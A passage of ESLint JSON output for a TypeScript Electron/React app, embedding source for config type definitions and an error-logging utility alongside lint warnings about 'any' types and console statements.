void;\n}\n\nexport interface MCPServerCardProps {\n  readonly name: ServerName;\n  readonly server: MCPServer;\n  readonly isGlobal?: boolean;\n  readonly onExpand?: (expanded: boolean) => void;\n  readonly className?: string;\n}\n\nexport interface ProjectCardProps {\n  readonly path: ProjectPath;\n  readonly config: ProjectConfig;\n  readonly onSelect?: (path: ProjectPath) => void;\n  readonly isSelected?: boolean;\n}\n\nexport interface StatsCardProps {\n  readonly icon: React.ReactNode;\n  readonly title: NonEmptyString;\n  readonly value: string | number;\n  readonly color: string;\n  readonly isLoading?: boolean;\n}\n\nexport interface ConfigSectionProps {\n  readonly title: NonEmptyString;\n  readonly data: unknown;\n  readonly isExpanded?: boolean;\n  readonly onToggle?: () => void;\n  readonly maxHeight?: number;\n}\n\n// API response types with proper error handling\nexport interface ClaudeConfigResponse {\n  readonly config: ClaudeConfig;\n  readonly lastModified: TimestampISO;\n  readonly fileSize: string;\n  readonly fileSizeBytes: number;\n  readonly success: true;\n}\n\nexport interface ClaudeConfigErrorResponse {\n  readonly error: string;\n  readonly timestamp: TimestampISO;\n  readonly success: false;\n}\n\nexport type ApiResponse = ClaudeConfigResponse | ClaudeConfigErrorResponse;\n\n// Type guards for runtime type checking\nexport function isConfigError(value: unknown): value is ConfigError {\n  return typeof value === 'object' && value !== null && 'type' in value;\n}\n\nexport function isSuccessResponse(response: ApiResponse): response is ClaudeConfigResponse {\n  return response.success === true;\n}\n\nexport function isErrorResponse(response: ApiResponse): response is ClaudeConfigErrorResponse {\n  return response.success === false;\n}\n\nexport function isValidServerType(value: string): value is ServerTypeValue {\n  return Object.values(ServerType).includes(value as ServerTypeValue);\n}\n\n// Utility functions for type creation\nexport function createServerName(name: string): ServerName {\n  if (!name || name.trim().length === 0) {\n    throw new Error('Server name cannot be empty');\n  }\n  return name.trim() as ServerName;\n}\n\nexport function createProjectPath(path: string): ProjectPath {\n  if (!path || path.trim().length === 0) {\n    throw new Error('Project path cannot be empty');\n  }\n  return path.trim() as ProjectPath;\n}\n\nexport function createNonEmptyString(value: string): NonEmptyString {\n  if (!value || value.trim().length === 0) {\n    throw new Error('String cannot be empty');\n  }\n  return value.trim() as NonEmptyString;\n}\n\nexport function createTimestamp(): TimestampISO {\n  return new Date().toISOString() as TimestampISO;\n}\n\n// Advanced utility types for component props\nexport type RequiredKeys<T> = {\n  [K in keyof T]-?: {} extends Pick<T, K> ? never : K;\n}[keyof T];\n\nexport type OptionalKeys<T> = {\n  [K in keyof T]-?: {} extends Pick<T, K> ? K : never;\n}[keyof T];\n\nexport type PartialBy<T, K extends keyof T> = Omit<T, K> & Partial<Pick<T, K>>;\nexport type RequiredBy<T, K extends keyof T> = Omit<T, K> & Required<Pick<T, K>>;\n\n// Hook return types with proper error handling\nexport interface UseClaudeConfigReturn {\n  readonly state: ConfigPageState;\n  readonly refreshConfig: () => Promise<void>;\n  readonly isLoading: boolean;\n  readonly error: ConfigError | null;\n  readonly config: ClaudeConfig | null;\n  readonly stats: ClaudeConfigStats | null;\n}\n\n// Theme-related types for consistent styling\nexport interface ThemeColors {\n  readonly primary: string;\n  readonly secondary: string;\n  readonly success: string;\n  readonly warning: string;\n  readonly error: string;\n  readonly info: string;\n}\n\nexport interface ServerTypeTheme {\n  readonly [ServerType.NPX]: ThemeColors['warning'];\n  readonly [ServerType.DOCKER]: ThemeColors['info'];\n  readonly [ServerType.PYTHON]: ThemeColors['success'];\n  readonly [ServerType.NODE]: ThemeColors['secondary'];\n  readonly [ServerType.BINARY]: ThemeColors['primary'];\n}\n\n// Export all types for use in components\nexport default ClaudeConfig;","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/types/index.ts","messages":[],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":0,"fixableErrorCount":0,"fixableWarningCount":0,"usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/utils/errorLogging.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":20,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":20,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[499,502],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[499,502],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":30,"column":16,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":30,"endColumn":19,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[690,693],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[690,693],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":49,"column":28,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":49,"endColumn":31,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[1153,1156],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[1153,1156],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":115,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":115,"endColumn":18,"suggestions":[{"fix":{"range":[2893,2958],"text":""},"messageId":"removeConsole","data":{"propertyName":"group"},"desc":"Remove the console.group()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":116,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":116,"endColumn":18,"suggestions":[{"fix":{"range":[2963,2994],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":117,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":117,"endColumn":18,"suggestions":[{"fix":{"range":[2999,3034],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":119,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":119,"endColumn":20,"suggestions":[{"fix":{"range":[3062,3108],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":121,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":121,"endColumn":21,"suggestions":[{"fix":{"range":[3119,3138],"text":""},"messageId":"removeConsole","data":{"propertyName":"groupEnd"},"desc":"Remove the console.groupEnd()."}]},{"ruleId":"@typescript-eslint/no-unused-vars","severity":1,"message":"'reportingError' is defined but never used.","line":130,"column":14,"nodeType":null,"messageId":"unusedVar","endLine":130,"endColumn":28},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":140,"column":55,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":140,"endColumn":58,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[3650,3653],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[3650,3653],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":154,"column":3,"nodeType":"MemberExpression","messageId":"unexpected","endLine":154,"endColumn":15,"suggestions":[{"fix":{"range":[3988,4053],"text":""},"messageId":"removeConsole","data":{"propertyName":"info"},"desc":"Remove the console.info()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":160,"column":41,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":160,"endColumn":44,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4158,4161],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4158,4161],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":172,"column":5,"nodeType":"MemberExpression","messageId":"unexpected","endLine":172,"endColumn":18,"suggestions":[{"fix":{"range":[4535,4597],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":179,"column":37,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":179,"endColumn":40,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4691,4694],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4691,4694],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]}],"suppressedMessages":[],"errorCount":0,"fatalErrorCount":0,"warningCount":14,"fixableErrorCount":0,"fixableWarningCount":0,"source":"import { ErrorInfo } from 'react';\n\n// 2025 TypeScript Error Categorization for Production\nexport type ErrorCategory = \n  | 'UI_COMPONENT_ERROR'\n  | 'DATA_FETCH_ERROR' \n  | 'VALIDATION_ERROR'\n  | 'PERMISSION_ERROR'\n  | 'NETWORK_ERROR'\n  | 'STORE_ERROR'\n  | 'IPC_ERROR'\n  | 'UNKNOWN_ERROR';\n\nexport type ErrorSeverity = 'low' | 'medium' | 'high' | 'critical';\n\nexport interface AppError extends Error {\n  category: ErrorCategory;\n  severity: ErrorSeverity;\n  code: string;\n  context?: Record<string, any>;\n  timestamp: string;\n  userId?: string;\n  sessionId?: string;\n}\n\nexport interface ErrorContext {\n  componentName?: string;\n  viewType?: string;\n  userActions?: string[];\n  storeState?: any;\n  route?: string;\n  userAgent?: string;\n  timestamp: string;\n}\n\n// Error reporting throttling to prevent spam\nconst errorReportingThrottle = new Map<string, number>();\nconst _THROTTLE_DURATION = 5000; // 5 seconds\n\n/**\n * Creates a standardized AppError with proper categorization\n */\nexport function createAppError(\n  message: string,\n  category: ErrorCategory,\n  severity: ErrorSeverity,\n  code: string,\n  originalError?: Error,\n  context?: Record<string, any>\n): AppError {\n  const error = new Error(message) as AppError;\n  \n  // Preserve original stack trace if available\n  if (originalError?.stack) {\n    error.stack = originalError.stack;\n  }\n  \n  error.category = category;\n  error.severity = severity;\n  error.code = code;\n  error.context = context;\n  error.timestamp = new Date().toISOString();\n  \n  // Add session info if available\n  error.sessionId = getSessionId();\n  error.userId = getUserId();\n  \n  return error;\n}\n\n/**\n * Enhanced error logging with context and throttling\n */\nexport function logError(\n  error: Error | AppError,\n  errorInfo?: ErrorInfo,\n  additionalContext?: Partial<ErrorContext>\n): void {\n  const timestamp = new Date().toISOString();\n  const errorKey = `${error.message}_${error.stack?.slice(0, 100)}`;\n  \n  // Throttle identical errors\n  const lastReported = errorReportingThrottle.get(errorKey);\n  if (lastReported && Date.now() - lastReported < _THROTTLE_DURATION) {\n    return;\n  }\n  \n  errorReportingThrottle.set(errorKey, Date.now());\n  \n  const context: ErrorContext = {\n    componentName: errorInfo?.componentStack?.split('\\n')[1]?.trim(),\n    userAgent: navigator.userAgent,\n    route: window.location.pathname,\n    timestamp,\n    ...additionalContext\n  };\n  \n  const errorReport = {\n    error: {\n      name: error.name,\n      message: error.message,\n      stack: error.stack,\n      category: (error as AppError).category || 'UNKNOWN_ERROR',\n      severity: (error as AppError).severity || 'medium',\n      code: (error as AppError).code || 'ERR_UNKNOWN'\n    },\n    context,\n    errorInfo: errorInfo ? {\n      componentStack: errorInfo.componentStack\n    } : undefined\n  };\n  \n  // Development logging\n  if (process.env.NODE_ENV === 'development') {\n    console.group(`ðŸš¨ Error Report [${errorReport.error.category}]`);\n    console.error('Error:', error);\n    console.error('Context:', context);\n    if (errorInfo) {\n      console.error('React Error Info:', errorInfo);\n    }\n    console.groupEnd();\n  }\n  \n  // Production error reporting\n  if (process.env.NODE_ENV === 'production') {\n    // Send to error monitoring service (Sentry, LogRocket, etc.)\n    try {\n      // Example implementation - replace with your service\n      reportToMonitoringService(errorReport);\n    } catch (reportingError) {\n      // Fallback: store locally for later upload\n      storeErrorLocally(errorReport);\n    }\n  }\n}\n\n/**\n * Reports errors to external monitoring service\n */\nasync function reportToMonitoringService(errorReport: any): Promise<void> {\n  // Implementation would depend on your monitoring service\n  // Example for a generic service:\n  /*\n  await fetch('/api/errors', {\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n    },\n    body: JSON.stringify(errorReport),\n  });\n  */\n  \n  // For now, just log that we would send it\n  console.info('Would report to monitoring service:', errorReport);\n}\n\n/**\n * Stores errors locally when remote reporting fails\n */\nfunction storeErrorLocally(errorReport: any): void {\n  try {\n    const errors = JSON.parse(localStorage.getItem('pending_errors') || '[]');\n    errors.push(errorReport);\n    \n    // Keep only last 50 errors to avoid storage overflow\n    if (errors.length > 50) {\n      errors.splice(0, errors.length - 50);\n    }\n    \n    localStorage.setItem('pending_errors', JSON.stringify(errors));\n  } catch (storageError) {\n    console.error('Failed to store error locally:', storageError);\n  }\n}\n\n/**\n * Gets pending errors from local storage\n */\nexport function getPendingErrors(): any[] {\n  try {\n    return JSON.parse(localStorage.getItem('pending_errors') || '[]');\n  } catch {\n    return [];\n  }\n}\n\n/**\n * Clears pending errors from local storage\n */\nexport function clearPendingErrors(): void {\n  localStorage.removeItem('pending_errors');\n}\n\n/**\n * Helper functions for user/session identification\n */\nfunction getSessionId(): string {\n  // Generate or retrieve session ID\n  let sessionId = sessionStorage.getItem('session_id');\n  if (!sessionId) {\n    sessionId = `sess_${Date.now()}_${Math.random().toString(36).substring(2)}`;\n    sessionStorage.setItem('session_id', sessionId);\n  }\n  return sessionId;\n}\n\nfunction getUserId(): string | undefined {\n  // This would typically come from your auth system\n  // For now, return undefined as we don't have user auth in this app\n  return undefined;\n}\n\n/**\n * React Error Boundary specific error handler\n */\nexport function handleErrorBoundaryError(\n  error: Error,\n  errorInfo: ErrorInfo,\n  componentLevel: 'app' | 'component' | 'route',\n  viewType?: string\n): void {\n  const appError = createAppError(\n    error.message,\n    'UI_COMPONENT_ERROR',\n    componentLevel === 'app' ? 'critical' : 'high',\n    'ERR_COMPONENT_CRASH',\n    error,\n    {\n      componentLevel,\n      viewType\n    }\n  );\n  \n  logError(appError, errorInfo, {\n    viewType,\n    componentName: errorInfo.componentStack?.split('\\n')[1]?.trim()\n  });\n}\n\n/**\n * Utility to create view-specific error handlers\n */\nexport function createViewErrorHandler(viewType: string) {\n  return (error: Error, errorInfo: ErrorInfo) => {\n    handleErrorBoundaryError(error, errorInfo, 'component', viewType);\n  };\n}","usedDeprecatedRules":[]},{"filePath":"/Users/davidleathers/taskmaster-ui/src/renderer/src/utils/sessionPreservation.ts","messages":[{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":29,"column":9,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":29,"endColumn":12,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[827,830],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[827,830],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":30,"column":11,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":30,"endColumn":14,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[842,845],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[842,845],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":31,"column":15,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":31,"endColumn":18,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[861,864],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[861,864],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":32,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":32,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[882,885],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[882,885],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":33,"column":12,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":33,"endColumn":15,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[898,901],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[898,901],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":34,"column":20,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":34,"endColumn":23,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[922,925],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[922,925],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":112,"column":33,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":112,"endColumn":36,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[2714,2717],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[2714,2717],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":147,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":147,"endColumn":20,"suggestions":[{"fix":{"range":[3889,4101],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":157,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":157,"endColumn":20,"suggestions":[{"fix":{"range":[4155,4207],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":165,"column":52,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":165,"endColumn":55,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[4424,4427],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[4424,4427],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":198,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":198,"endColumn":20,"suggestions":[{"fix":{"range":[5362,5540],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":206,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":206,"endColumn":20,"suggestions":[{"fix":{"range":[5589,5640],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":221,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":221,"endColumn":20,"suggestions":[{"fix":{"range":[6081,6129],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":240,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":240,"endColumn":20,"suggestions":[{"fix":{"range":[6585,6630],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":243,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":243,"endColumn":20,"suggestions":[{"fix":{"range":[6678,6728],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":260,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":260,"endColumn":20,"suggestions":[{"fix":{"range":[7061,7099],"text":""},"messageId":"removeConsole","data":{"propertyName":"debug"},"desc":"Remove the console.debug()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":262,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":262,"endColumn":20,"suggestions":[{"fix":{"range":[7128,7178],"text":""},"messageId":"removeConsole","data":{"propertyName":"error"},"desc":"Remove the console.error()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":269,"column":58,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":269,"endColumn":61,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7293,7296],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7293,7296],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":269,"column":65,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":269,"endColumn":68,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7300,7303],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7300,7303],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":270,"column":17,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":270,"endColumn":20,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[7322,7325],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[7322,7325],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":309,"column":64,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":309,"endColumn":67,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8254,8257],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8254,8257],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":310,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":310,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8292,8295],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8292,8295],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":327,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":327,"endColumn":19,"suggestions":[{"fix":{"range":[8712,8767],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":336,"column":45,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":336,"endColumn":48,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8890,8893],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8890,8893],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":337,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":337,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[8932,8935],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[8932,8935],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":343,"column":42,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":343,"endColumn":45,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9144,9147],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9144,9147],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":346,"column":32,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":346,"endColumn":35,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9268,9271],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9268,9271],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":357,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":357,"endColumn":19,"suggestions":[{"fix":{"range":[9566,9618],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":366,"column":50,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":366,"endColumn":53,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9749,9752],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9749,9752],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":367,"column":34,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":367,"endColumn":37,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[9789,9792],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[9789,9792],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":383,"column":13,"nodeType":"MemberExpression","messageId":"unexpected","endLine":383,"endColumn":25,"suggestions":[{"fix":{"range":[10273,10337],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"no-console","severity":1,"message":"Unexpected console statement.","line":388,"column":7,"nodeType":"MemberExpression","messageId":"unexpected","endLine":388,"endColumn":19,"suggestions":[{"fix":{"range":[10398,10455],"text":""},"messageId":"removeConsole","data":{"propertyName":"warn"},"desc":"Remove the console.warn()."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":437,"column":30,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":437,"endColumn":33,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11400,11403],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is correct."},{"messageId":"suggestNever","fix":{"range":[11400,11403],"text":"never"},"desc":"Use `never` instead, this is useful when instantiating generic type parameters that you don't need to know the type of."}]},{"ruleId":"@typescript-eslint/no-explicit-any","severity":1,"message":"Unexpected any. Specify a different type.","line":437,"column":36,"nodeType":"TSAnyKeyword","messageId":"unexpectedAny","endLine":437,"endColumn":39,"suggestions":[{"messageId":"suggestUnknown","fix":{"range":[11406,11409],"text":"unknown"},"desc":"Use `unknown` instead, this will force you to explicitly, and safely assert the type is 